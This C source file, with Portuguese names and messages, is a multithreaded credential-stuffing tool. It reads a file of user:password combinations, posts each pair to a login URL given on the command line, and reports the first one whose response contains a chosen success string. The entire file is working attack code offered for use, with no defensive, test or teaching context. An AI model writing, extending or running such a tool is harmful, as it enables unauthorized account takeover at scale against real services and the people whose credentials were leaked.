#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <curl/curl.h>

#define MAX_LINES 10000000
#define MAX_LINE_LEN 1024
#define MAX_THREADS 100

char **combos;
int num_combos = 0;
char *url;
char *success_str;
char *error_str;
int thread_count = 10;
int found = 0;
pthread_mutex_t print_mutex = PTHREAD_MUTEX_INITIALIZER;

typedef struct {
    int start;
    int end;
} ThreadArgs;

typedef struct {
    char *memory;
    size_t size;
} MemoryStruct;

void *xmalloc(size_t size) {
    void *p = malloc(size);
    if (!p) {
        perror("malloc");
        exit(1);
    }
    return p;
}

void carregar_combos(const char *arquivo) {
    FILE *fp = fopen(arquivo, "r");
    if (!fp) {
        perror("Erro abrindo arquivo de combinações");
        exit(1);
    }

    combos = xmalloc(MAX_LINES * sizeof(char *));
    char linha[MAX_LINE_LEN];
    while (fgets(linha, sizeof(linha), fp)) {
        linha[strcspn(linha, "\n")] = 0;
        combos[num_combos++] = strdup(linha);
    }
    fclose(fp);
}

size_t escrever_resposta(void *ptr, size_t size, size_t nmemb, void *userdata) {
    size_t total = size * nmemb;
    MemoryStruct *mem = (MemoryStruct *)userdata;

    mem->memory = realloc(mem->memory, mem->size + total + 1);
    if (!mem->memory) return 0;

    memcpy(&(mem->memory[mem->size]), ptr, total);
    mem->size += total;
    mem->memory[mem->size] = '\0';

    return total;
}

int testar_credencial(const char *combo) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    char usuario[512], senha[512];
    sscanf(combo, "%[^:]:%s", usuario, senha);

    char post_data[1024];
    snprintf(post_data, sizeof(post_data), "username=%s&password=%s", usuario, senha);

    MemoryStruct chunk = {.memory = xmalloc(1), .size = 0};

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, escrever_resposta);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

    CURLcode res = curl_easy_perform(curl);
    int sucesso = 0;

    if (res == CURLE_OK) {
        if (strstr(chunk.memory, success_str) &&
           (!error_str || !strstr(chunk.memory, error_str))) {
            sucesso = 1;
        }
    }

    curl_easy_cleanup(curl);
    free(chunk.memory);
    return sucesso;
}

void *thread_func(void *arg) {
    ThreadArgs *args = (ThreadArgs *)arg;

    for (int i = args->start; i < args->end && !found; i++) {
        if (testar_credencial(combos[i])) {
            pthread_mutex_lock(&print_mutex);
            if (!found) {
                found = 1;
                printf("\033[1;32m[✓] SUCESSO:\033[0m %s\n", combos[i]);
            }
            pthread_mutex_unlock(&print_mutex);
            break;
        }
    }

    free(arg);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 5 || argc > 6) {
        printf("Uso: %s <url> <arquivo_combo> <success_str> <threads> [<error_str> opcional]\n", argv[0]);
        return 1;
    }

    url = argv[1];
    char *arquivo_combo = argv[2];
    success_str = argv[3];
    thread_count = atoi(argv[4]);
    error_str = (argc == 6) ? argv[5] : NULL;

    if (thread_count > MAX_THREADS) thread_count = MAX_THREADS;

    curl_global_init(CURL_GLOBAL_ALL);
    carregar_combos(arquivo_combo);

    int por_thread = (num_combos + thread_count - 1) / thread_count;
    pthread_t threads[MAX_THREADS];

    for (int i = 0; i < thread_count; i++) {
        ThreadArgs *args = malloc(sizeof(ThreadArgs));
        args->start = i * por_thread;
        args->end = (i + 1) * por_thread;
        if (args->end > num_combos) args->end = num_combos;
        pthread_create(&threads[i], NULL, thread_func, args);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    if (!found) {
        printf("\033[1;31m[x] Nenhuma combinação funcionou.\033[0m\n");
    }

    curl_global_cleanup();
    return 0;
}